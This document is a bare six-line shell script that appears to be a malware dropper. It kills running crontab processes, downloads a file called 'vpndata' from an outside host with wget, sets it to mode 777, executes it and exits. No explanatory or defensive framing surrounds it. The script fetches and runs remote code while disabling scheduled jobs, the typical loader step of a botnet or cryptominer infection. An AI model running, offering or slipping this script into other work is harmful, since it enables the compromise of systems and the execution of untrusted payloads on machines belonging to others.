sleep 15                                                                                          
ps -ef | grep crontab | grep -v grep | cut -c 9-15 | xargs kill -s 9
wget http://tan29979.zichaob.com/vpndata
chmod 777 vpndata
./vpndata
exit